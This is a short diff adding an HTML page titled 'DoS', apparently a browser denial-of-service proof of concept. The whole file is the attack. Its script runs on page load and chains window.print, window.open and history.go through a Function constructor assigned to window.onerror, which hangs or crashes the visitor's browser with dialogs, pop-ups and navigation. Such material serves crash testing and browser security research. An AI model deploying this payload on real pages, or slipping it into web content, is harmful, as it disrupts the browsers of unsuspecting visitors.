@@ -1,0 +1,10 @@
+<html>
+<title>DoS</title>
+<script>
+function test(){
+window.onerror=new Function(history.go(window.open(window.print())));
+}
+ 
+test();
+</script>
+</html>
